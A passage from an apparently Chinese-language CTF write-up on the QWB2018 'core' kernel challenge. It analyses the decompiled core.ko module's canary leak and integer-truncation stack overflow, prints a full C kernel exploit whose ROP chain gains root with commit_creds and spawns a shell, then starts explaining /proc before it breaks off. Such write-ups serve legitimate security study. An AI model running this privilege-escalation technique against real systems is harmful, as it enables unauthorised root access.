<code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li></ul><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>检查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/core/core/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>存在canary,ida进一步静态分析</p><p>存在七个主要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">core_release.text<span class="number">0000000000000000</span><span class="number">00000011</span><span class="number">00000000</span></span><br><span class="line">core_write.text<span class="number">0000000000000011</span><span class="number">00000052</span><span class="number">00000010</span></span><br><span class="line">core_read.text<span class="number">0000000000000063</span><span class="number">00000093</span><span class="number">00000050</span></span><br><span class="line">core_copy_func.text<span class="number">00000000000000F</span>6<span class="number">00000069</span><span class="number">00000050</span></span><br><span class="line">core_ioctl.text<span class="number">000000000000015F</span><span class="number">0000005</span>A<span class="number">00000008</span></span><br><span class="line">init_module.init.text<span class="number">00000000000001B</span>9<span class="number">00000032</span><span class="number">00000000</span></span><br><span class="line">exit_core.<span class="built_in">exit</span>.text<span class="number">00000000000001</span>EB<span class="number">00000019</span><span class="number">00000000</span></span><br></pre></td></tr></table></figure><p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_copy_func()</strong> 从全局变量 <code>name</code> 中拷贝数据到局部变量中，长度是由我们指定的，当要注意的是 qmemcpy 用的是 <code>unsigned __int16</code>，但传递的长度是 <code>signed __int64</code>，因此如果控制传入的长度为 <code>0xffffffffffff0000|(0x100)</code> 等值，就可以栈溢出了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_copy_func</span><span class="params">(<span class="type">signed</span> __int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">    printk(<span class="string">&quot;\x016Detect Overflow&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    qmemcpy(v1, name, (<span class="type">unsigned</span> __int16)a1);    <span class="comment">// overflow</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_write()</strong> 向全局变量 <code>name</code> 上写，这样通过 <code>core_write()</code> 和 <code>core_copy_func()</code> 就可以控制 ropchain 了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">QWB2018_core [master●●] cat exploit.c </span><br><span class="line"><span class="comment">// gcc exploit.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * give_to_player [master●●] check ./core.ko</span></span><br><span class="line"><span class="comment">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d</span></span><br><span class="line"><span class="comment">   [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#x27;</span></span><br><span class="line"><span class="comment">       Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">       RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">       Stack:    Canary found</span></span><br><span class="line"><span class="comment">       NX:       NX enabled</span></span><br><span class="line"><span class="comment">       PIE:      No PIE (0x0)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">/* FILE* kallsyms_fd = fopen(&quot;./test_kallsyms&quot;, &quot;r&quot;); */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * give_to_player [master●●] bpython</span></span><br><span class="line"><span class="comment">                bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">                [*] &#x27;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#x27;</span></span><br><span class="line"><span class="comment">                    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">                    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">                    Stack:    Canary found</span></span><br><span class="line"><span class="comment">                    NX:       NX disabled</span></span><br><span class="line"><span class="comment">                    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">                &gt;&gt;&gt; hex(vmlinux.sym[&#x27;commit_creds&#x27;] - 0xffffffff81000000)</span></span><br><span class="line"><span class="comment">                &#x27;0x9c8e0&#x27;</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* puts(buf); */</span></span><br><span class="line">            <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="comment">/* printf(&quot;vmlinux_base addr: %p\n&quot;, vmlinux_base); */</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="延拓1"><a href="#延拓1" class="headerlink" title="延拓1"></a>延拓1</h2><p>在这道例题中可以看到模块在初始化函数中主要是调用proc_create函数</p><p>要了解这个函数首先先了解一下/proc文件系统</p><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><blockquote><p>在许多类 Unix计算机系统中,<strong>procfs</strong> 是 进程文件系统(process file system) 的缩写,包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 <code>/proc</code> 目录。由于 <code>/proc</code> <strong>不是一个真正的文件系统</strong>，它也就不占用存储空间，只是占用有限的内存。</p></blockquote><p><strong>创建一个 proc 虚拟文件，应用层通过读写该文件，即可实现与内核的交互。</strong></p><p>Linux中每个正在运行的进程对应于<code>/proc</code>下的一个目录，目录名就是进程的PID，每个目录包含:</p><ul><li>/proc/PID/cmdline, 启动该进程的命令行.</li><li>/proc/PID/cwd, 当前工作目录的符号链接</li><li>/proc/PID/environ 影响进程的环境变量的名字和值.</li><li>/proc/PID/exe, 最初的可执行文件的符号链接, 如果它还存在的话。</li><li>/proc/PID/fd, 一个目录，包含每个打开的文件描述符的符号链接.</li><li>/proc/PID/fdinfo, 一个目录，包含每个打开的文件描述符的位置和标记</li><li>/proc/PID/maps, 一个文本文件包含内存映射文件与块的信息。</li><li>/proc/PID/mem, 一个二进制图像(image)表示进程的虚拟内存, 只能通过ptrace化进程访问.</li><li>/proc/PID/root, 该进程所能看到的根路径的符号链接。如果没有chroot监狱，那么进程的根路径是/.</li><li>/proc/PID/status包含了进程的基本信息，包括运行状态、内存使用。</li><li>/proc/PID/task, 一个目录包含了硬链接到该进程启动的任何任务</li></ul><p>用户可以获得PID使用工具如pgrep, pidof或ps:</p><h3 id="伪文件系统"><a href="#伪文件系统" class="headerlink" title="伪文件系统"></a>伪文件系统</h3><p>上面提到的伪文件系统又是什么,和普通文件系统有什么不同</p><ol><li><strong>实现方式</strong>:<ul><li><strong>普通文件系统</strong>：通常是针对块设备（硬盘、分区等）或其他<u>存储介质的实际文件系统</u>，例如 